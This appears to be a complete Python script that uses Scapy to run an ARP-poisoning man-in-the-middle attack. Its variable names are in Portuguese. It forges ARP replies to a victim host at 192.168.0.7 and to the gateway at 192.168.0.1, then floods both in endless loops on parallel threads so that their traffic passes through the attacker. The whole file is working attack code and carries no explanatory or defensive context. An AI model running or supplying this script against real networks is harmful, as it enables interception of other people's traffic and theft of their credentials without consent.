from scapy.all import *
import threading

vitima = "192.168.0.7"
gateway = "192.168.0.1"

envenenaVitima = Ether() / ARP(pdst=vitima, psrc=gateway, op="is-at")
envenenaGateway = Ether() / ARP(pdst=gateway, psrc=vitima, op="is-at")

def MiTM():
    sendp(envenenaVitima, inter=1, loop=True) #1

threading.Thread(target=MiTM).start() #2
sendp(envenenaGateway, inter=1, loop=True) #3